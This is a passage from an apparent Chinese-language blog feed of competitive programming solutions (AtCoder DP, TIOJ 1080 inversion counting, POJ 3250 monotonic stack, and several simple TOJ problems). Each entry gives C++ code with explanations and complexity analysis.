<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於點 $1$ 到點 $n-1$ ，每個點都只能選兩種狀態，取其最大值即可<br>定義 $DP[i][j]$ 表示第 $i$ 天選擇第 $j$ 種活動時的最大價值總和<br>則有轉移式 $DP[i][j] = max(DP[i][s], DP[i-1][t])+arr[i][j],\ s \neq j,\ t\neq j,\ s\neq t$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MaxN = <span class="number">100005</span>;</span><br><span class="line"><span class="keyword">int</span> n,now,dp[MaxN][<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">3</span> ; j++)&#123;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;now;</span><br><span class="line">				dp[i][j]=max(dp[i<span class="number">-1</span>][(j+<span class="number">1</span>)%<span class="number">3</span>], dp[i<span class="number">-1</span>][((j+<span class="number">2</span>)%<span class="number">3</span>)]) + now;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">3</span> ; i++)&#123;</span><br><span class="line">			ans=max(ans, dp[n][i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $3n$ 種狀態，每種狀態轉移複雜度為 $O(2)$<br>總複雜度 $O(n)$</p>
]]></content>
      <categories>
        <category>AtCoder</category>
      </categories>
      <tags>
        <tag>AtCoder</tag>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title>TIOJ 1080</title>
    <url>/2020/09/25/TIOJ1080/</url>
    <content><![CDATA[<h1 id="TIOJ-1080"><a href="#TIOJ-1080" class="headerlink" title="TIOJ 1080"></a>TIOJ 1080</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://tioj.ck.tp.edu.tw/problems/1080" target="_blank" rel="noopener">https://tioj.ck.tp.edu.tw/problems/1080</a><br>逆敘數對模板題<br>對於一個數列 $S$ 若 $S$ 的第 $i$ 項 $s_i$ 與第 $j$ 項 $s_j$ 符合 $s_i&gt;s_j$ ，並且 $i&lt;j$ ，那麼我們說 $(i,j)$ 是一個逆序數對。請問給定 $S$ ，總共有多少個逆序數對</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於一個元素來說，他的逆敘數對數量會跟在這個元素之後比該元素還小的數量相同<br>也就是說，我們的目的是要每個元素找到符合這樣條件的數量總和</p>
<p>如果今天我們拿到的是一個<strong>已經排序好的序列</strong>，保證元素是<strong>嚴格遞增</strong><br>那麼我們可以很快的知道每個元素的逆敘述對有多少個</p>
<table>
<thead>
<tr>
<th>元素</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
</tr>
</thead>
<tbody><tr>
<td>逆敘數對量</td>
<td>4</td>
<td>3</td>
<td>2</td>
<td>1</td>
<td>0</td>
</tr>
</tbody></table>
<p>換個角度來想，也就是我們希望能做出一個<strong>具有規律性的序列</strong>，如此一來就可以很快速的解出每個元素的答案<br>可以利用 merge sort 來處理這樣的問題<br>在排序的過程當中，我們會不斷地將序列分成兩個部分<br>而當左邊的元素 $i$ 大於右邊的元素 $j$ 時，我們可以很明顯的知道<br><strong>與 $i$ 以及 $i$ 後面屬於左邊的元素和 $j$ 必定會是逆敘數對</strong><br>因此每次遇到這種情況就加上還在左邊的元素數量</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,Case=<span class="number">1</span>,arr[<span class="number">2000100</span>],ans=<span class="number">0</span>,tmp[<span class="number">2000100</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> L,<span class="keyword">int</span> R)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> mid=(L+R)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=L,j=mid+<span class="number">1</span>,k=L ; k&lt;=R ; k++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(i&gt;mid)</span><br><span class="line">			tmp[k]=arr[j++];</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(j&gt;R)</span><br><span class="line">			tmp[k]=arr[i++];</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(arr[i]&lt;=arr[j])</span><br><span class="line">			tmp[k]=arr[i++];</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			ans+=(mid-i+<span class="number">1</span>);</span><br><span class="line">			tmp[k]=arr[j++];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=L ; i&lt;=R ; i++)</span><br><span class="line">		arr[i]=tmp[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge_sort</span><span class="params">(<span class="keyword">int</span> L,<span class="keyword">int</span> R)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> mid=(L+R)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(L==R)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	merge_sort(L,mid);</span><br><span class="line">	merge_sort(mid+<span class="number">1</span>,R);</span><br><span class="line">	merge(L,R);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		merge_sort(<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;Case++&lt;&lt;<span class="string">": "</span>&lt;&lt;ans&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>與 merge sort 相同 $O(NlogN)$</p>
]]></content>
      <categories>
        <category>TIOJ</category>
      </categories>
      <tags>
        <tag>TIOJ</tag>
        <tag>counting inversion</tag>
      </tags>
  </entry>
  <entry>
    <title>POJ 3250</title>
    <url>/2020/09/11/POJ3250/</url>
    <content><![CDATA[<h1 id="POJ-3250"><a href="#POJ-3250" class="headerlink" title="POJ 3250"></a>POJ 3250</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://vjudge.net/problem/POJ-3250" target="_blank" rel="noopener">https://vjudge.net/problem/POJ-3250</a><br>可見杆問題<br>給一群杆子的高度，求在每根杆子上向右看能看到的杆子數量總和<br>定義能看到是<strong>你所在的桿杆和該桿杆之間的所有桿杆高度都小於你所在的桿杆的高度</strong></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>觀察能看到其他杆子的集合所形成的序列可以發現是呈現 <strong>遞減</strong> 的狀態<br>因此我們只要能維護一個嚴格遞減的序列，剩下的就必定會是能看到其他人的杆子<br>因為這裡的狀態是先進後出，跟stack一樣，所以選擇stack<br>每次將stack內所剩餘的元素數量加總即可求解</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,ans=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; st;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span>(!st.empty()) st.pop();</span><br><span class="line">		<span class="keyword">while</span>(n--)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;m;</span><br><span class="line">			<span class="keyword">while</span>(!st.empty() &amp;&amp; m&gt;=st.top())</span><br><span class="line">				st.pop();</span><br><span class="line">			ans+=st.size();</span><br><span class="line">			st.push(m);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>掃過一次字串即可，複雜度 $O(len(m))$<br>總複雜度 $O(nlen(m))$</p>
]]></content>
      <categories>
        <category>POJ</category>
      </categories>
      <tags>
        <tag>POJ</tag>
        <tag>資料結構</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 110</title>
    <url>/2021/03/23/TOJ110/</url>
    <content><![CDATA[<h1 id="TOJ-110"><a href="#TOJ-110" class="headerlink" title="TOJ 110"></a>TOJ 110</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/110/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/110/</a></p>
<p>第一行有一個正整數數 $n$，接下來有 $n$ 行，每行有一個數，表示三角形的高度</p>
<p>請依照題目的樣子輸出六芒星</p>
<p>例如 $n = 4$ 時輸出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   *</span><br><span class="line">*******</span><br><span class="line"> *****</span><br><span class="line">*******</span><br><span class="line">   *</span><br></pre></td></tr></table></figure>

<p>$n = 5$ 時輸出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    *</span><br><span class="line">   ***</span><br><span class="line">*********</span><br><span class="line"> *******</span><br><span class="line">*********</span><br><span class="line">   ***</span><br><span class="line">    *</span><br></pre></td></tr></table></figure>

<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>把六芒星拆成上面的三角形、中間三個橫線、下面的三角形來輸出</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n,m;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">while</span>(n--)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;m;</span><br><span class="line">		<span class="comment">// 上面星星樹樹</span></span><br><span class="line">		<span class="comment">// i 表示行數</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;m<span class="number">-3</span> ; i++)&#123;</span><br><span class="line">			<span class="comment">// 先輸出空白</span></span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;m<span class="number">-1</span>-i ; j++)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">' '</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 再輸出星星</span></span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;(i+<span class="number">1</span>)*<span class="number">2</span><span class="number">-1</span> ; j++)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">'*'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 中間三條線</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">2</span>*m<span class="number">-1</span> ; i++)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">'*'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n "</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">2</span>*m<span class="number">-3</span> ; i++)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">'*'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">2</span>*m<span class="number">-1</span> ; i++)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">'*'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 下面星星樹</span></span><br><span class="line">		<span class="comment">// i 表示行數</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;m<span class="number">-3</span> ; i++)&#123;</span><br><span class="line">			<span class="comment">// 先輸出空白</span></span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">3</span>+i ; j++)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">' '</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 再輸出星星</span></span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;(m<span class="number">-3</span>)*<span class="number">2</span><span class="number">-1</span><span class="number">-2</span>*i ; j++)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">'*'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度約為 $O(n(2m^2 + 3m))$ 約為 $O(nm^2)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 101</title>
    <url>/2021/03/23/TOJ101/</url>
    <content><![CDATA[<h1 id="TOJ-101"><a href="#TOJ-101" class="headerlink" title="TOJ 101"></a>TOJ 101</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/101/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/101/</a></p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;(<span class="keyword">char</span>)(<span class="string">'A'</span>+n<span class="number">-1</span>)&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 104</title>
    <url>/2021/03/23/TOJ104/</url>
    <content><![CDATA[<h1 id="TOJ-104"><a href="#TOJ-104" class="headerlink" title="TOJ 104"></a>TOJ 104</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/104/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/104/</a></p>
<p>輸入一個正整數 $n$ ，輸出高度為 $n$ 的星星樹</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>第一次接觸星星樹這類的題目可以藉由觀察來寫下迴圈</p>
<p>我們可以先把星星樹的每一層給一個數字</p>
<p>以下考慮 $n=4$ 的情況</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 |   *</span><br><span class="line">1 |  ***</span><br><span class="line">2 | *****</span><br><span class="line">3 |*******</span><br></pre></td></tr></table></figure>

<p>接下來觀察每一行內空格和數字的關係</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第 0 行 有 3 個空格</span><br><span class="line">第 1 行 有 2 個空格</span><br><span class="line">第 2 行 有 1 個空格</span><br><span class="line">第 3 行 有 0 個空格</span><br></pre></td></tr></table></figure>

<p>因為空格的數量與 $n$ 息息相關，我們換成與 $n$ 相關的話來看看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第 0 行 有 n-1 個空格</span><br><span class="line">第 1 行 有 n-2 個空格</span><br><span class="line">第 2 行 有 n-3 個空格</span><br><span class="line">第 3 行 有 n-4 個空格</span><br></pre></td></tr></table></figure>

<p>再加上與行數的關係</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第 0 行 有 (n-1)-0 個空格</span><br><span class="line">第 1 行 有 (n-1)-1 個空格</span><br><span class="line">第 2 行 有 (n-1)-2 個空格</span><br><span class="line">第 3 行 有 (n-1)-3 個空格</span><br></pre></td></tr></table></figure>

<p>發現到關係了嗎? 那麼我們也考慮星星的情況</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第 0 行 有 1 個星星</span><br><span class="line">第 1 行 有 3 個星星</span><br><span class="line">第 2 行 有 5 個星星</span><br><span class="line">第 3 行 有 7 個星星</span><br></pre></td></tr></table></figure>

<p>星星的數量無論 $n$ 是多少，順序仍然相同，都是從 $1$ 開始，並且每次加上 $2$ ，所以接下來直接考慮與行數的關係</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第 0 行 有 (0+1)*2-1 個星星</span><br><span class="line">第 1 行 有 (1+1)*2-1 個星星</span><br><span class="line">第 2 行 有 (2+1)*2-1 個星星</span><br><span class="line">第 3 行 有 (3+1)*2-1 個星星</span><br></pre></td></tr></table></figure>

<p>有了這些關係式，我們就可以輕易地寫出巢狀迴圈了</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="comment">// i 表示行數</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="comment">// 先輸出空格</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;n<span class="number">-1</span>-i ; j++)&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">' '</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">// 再輸出星星</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">2</span>*(i+<span class="number">1</span>)<span class="number">-1</span> ; j++)&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">'*'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度約為 $O(n^2)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 103</title>
    <url>/2021/03/23/TOJ103/</url>
    <content><![CDATA[<h1 id="TOJ-103"><a href="#TOJ-103" class="headerlink" title="TOJ 103"></a>TOJ 103</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/103/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/103/</a></p>
<p>輸入兩個字串分別表示茶的種類以及甜度</p>
<p>如果種類和甜度都相同就輸出 GOOD</p>
<p>如果只有一種相同就輸出 =~=</p>
<p>如果兩個都不同就輸出 OTZ</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>先分別記錄名稱和甜度是否相同，再利用條件判斷輸出即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> s1,s2;</span><br><span class="line">    <span class="keyword">int</span> n1,n2;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;s1&gt;&gt;n1&gt;&gt;s2&gt;&gt;n2;</span><br><span class="line">    <span class="keyword">bool</span> name = (s1==s2);</span><br><span class="line">    <span class="keyword">bool</span> sweet = (n1==n2);</span><br><span class="line">    <span class="keyword">if</span>(name &amp;&amp; sweet)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"GOOD\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(name || sweet)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"=~=\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"OTZ\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 114</title>
    <url>/2021/03/23/TOJ114/</url>
    <content><![CDATA[<h1 id="TOJ-114"><a href="#TOJ-114" class="headerlink" title="TOJ 114"></a>TOJ 114</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/114/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/114/</a></p>
<p>給一個 $n \times m$ 的陣列，如果其中有連續三個相同的連續元素在同一行或列上，輸出 Yes ，否則輸出 No</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>分別檢查列以及行是否有相同元素即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> arr[<span class="number">5</span>][<span class="number">6</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">5</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">6</span> ; j++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">bool</span> find_ans=<span class="literal">false</span>;</span><br><span class="line">	<span class="comment">// row</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,cnt=<span class="number">1</span> ; i&lt;<span class="number">5</span> ; i++,cnt=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span> ; j&lt;<span class="number">6</span> &amp;&amp; !find_ans ; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(arr[i][j] == arr[i][j<span class="number">-1</span>])</span><br><span class="line">				cnt++;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				cnt=<span class="number">1</span>;</span><br><span class="line">			<span class="keyword">if</span>(cnt==<span class="number">3</span>)</span><br><span class="line">				find_ans=<span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span 